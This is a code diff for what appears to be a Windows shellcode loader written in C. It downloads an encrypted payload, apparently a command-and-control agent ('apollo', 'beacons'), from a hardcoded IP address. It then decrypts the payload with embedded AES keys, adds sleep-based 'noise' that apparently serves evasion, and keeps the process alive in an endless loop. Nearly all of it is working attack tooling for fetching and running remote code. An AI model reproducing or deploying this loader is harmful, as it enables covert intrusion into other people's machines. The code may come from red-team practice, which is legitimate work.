@@ -158,7 +158,7 @@ BOOL ShellcodeFromUrl(PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
     }
 
     // Open the handle to the shellcode specified by HTTP URL.
-    LPCWSTR binFile = L"http://192.168.235.130:8000/beacons/apollo-enc.bin";
+    LPCWSTR binFile = L"http://192.168.235.130:8000/apollo.bin.enc";
     hInternetShellcode = InternetOpenUrlW(hInternet, binFile, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
     if (hInternetShellcode == NULL) {
         printf("InternetOpenUrlW Failed with error code: %d \n", GetLastError());
@@ -217,11 +217,11 @@ BOOL randomNoise(int s) {
     DWORD username_len = UNLEN + 1;
 
     if (GetUserName(username, &username_len)) {
-        wprintf(L"%.*s", 40, L"****************************************");
+        printf("*****************************************\n");
     }
     else {
         if (GetLastError != NULL) {
-            wprintf(L"%.*s", 40, L"****************************************");
+            printf("****************************************\n");
         }
     }
     Sleep(s);
@@ -246,6 +246,7 @@ int main() {
     printf("[i] Size  : %ld \n", Size);
 
     // Printing the shellcode into bytes.
+    // Dont print large shellcodes
     /*
     for (int i = 0; i < Size; i++) {
         if (i % 16 == 0)
@@ -277,15 +278,18 @@ int main() {
     PVOID	pPlaintext = NULL;
     DWORD	dwPlainSize = NULL;
     unsigned char AesKey[] = {
-    0xBF, 0xC3, 0xFD, 0xAE, 0xEC, 0xEE, 0xAA, 0x60, 0xEA, 0xFA, 0xB3, 0xFC, 0x32, 0x0C, 0xFC, 0xE5,
-    0x6E, 0xB9, 0x13, 0x81, 0x38, 0xBF, 0x13, 0x8F, 0x25, 0xF3, 0xC8, 0xBB, 0x02, 0x7B, 0x13, 0x6F };
+        0x6B, 0x06, 0xB0, 0x63, 0xBF, 0x97, 0x4C, 0x66, 0x6B, 0x88, 0xB4, 0x99, 0x42, 0xFB, 0x5E, 0xB4,
+        0x3E, 0xEB, 0xBF, 0x38, 0xE0, 0x53, 0x94, 0xC8, 0x67, 0xDD, 0xAF, 0xFC, 0x1F, 0xE6, 0xC3, 0x44
+    };
 
 
     unsigned char AesIv[] = {
-        0x0E, 0x39, 0x84, 0x32, 0xA6, 0x40, 0x44, 0xB3, 0x20, 0x1A, 0x20, 0x21, 0x13, 0xD1, 0x89, 0x77 };
-
+        0x47, 0x9D, 0x1D, 0xF0, 0x7C, 0xA1, 0xD2, 0x4C, 0x18, 0x55, 0xBD, 0x30, 0xAB, 0xCB, 0x9B, 0xAA
+    };
+    
 
     // Calling the decryption function
+    printf("Size %d\n", Size);
     if (!SimpleDecryption(Bytes, Size, AesKey, AesIv, &pPlaintext, &dwPlainSize)) {
         printf("Decryption exited with code: %d \n", GetLastError());
         return -1;
@@ -295,6 +299,7 @@ int main() {
     randomNoise(1);
 
     // Printing the decypted shellcode
+    // Dont print large shellcodes 
     /*
     printf("\n[>] decrypted shellcode:\n");
     for (int i = 0; i < dwPlainSize; i++) {
@@ -335,6 +340,13 @@ int main() {
 
     // Freeing pDeobfuscatedPayload
     HeapFree(GetProcessHeap(), 0, pPlaintext);
-    //printf("[#] Press <Enter> To Quit ... ");
-    //getchar();
+    
+    // Infinite loop so process never ends untill CTRL + C
+    while (TRUE){}
+
+    // Or use "any" key if you want
+    /*
+    printf("\n[#] Press <Enter> To Quit ... ");
+    getchar();
+    */
 }
